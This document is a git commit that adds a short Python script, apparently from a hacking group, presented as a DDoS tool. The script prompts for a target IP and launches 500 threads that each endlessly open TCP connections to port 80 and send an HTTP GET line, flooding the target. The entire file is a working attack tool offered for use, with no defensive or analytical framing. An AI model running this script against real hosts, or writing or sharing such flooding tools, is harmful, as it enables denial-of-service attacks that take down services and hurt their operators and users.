8e77d8bbe308acb558bc0f24620fdfd1fe9f979f
Bunny Sayne <68145612+BunnySayne@users.noreply.github.com>
2020-07-11 17:47:49 +0300

    Add files via upload

---
+++ AkrepHackTimDDoS.py
@@ -0,0 +1,33 @@
+import socket
+import threading
+import os
+
+os.system("clear")
+banner="""
+###############################
+#Akrep Hack Tim DDoS           #
+#Code By Bunny Sayne          #
+###############################
+"""
+print (banner)
+
+target = input("hedef ip:")
+port = 80
+
+attack_num = 0
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+
+        global attack_num
+        attack_num += 1
+        print("Saldiri Basladi!")
+        print(attack_num)
+
+        s.close()
+
+for i in range(500):
+    thread = threading.Thread(target= attack)
+    thread.start()
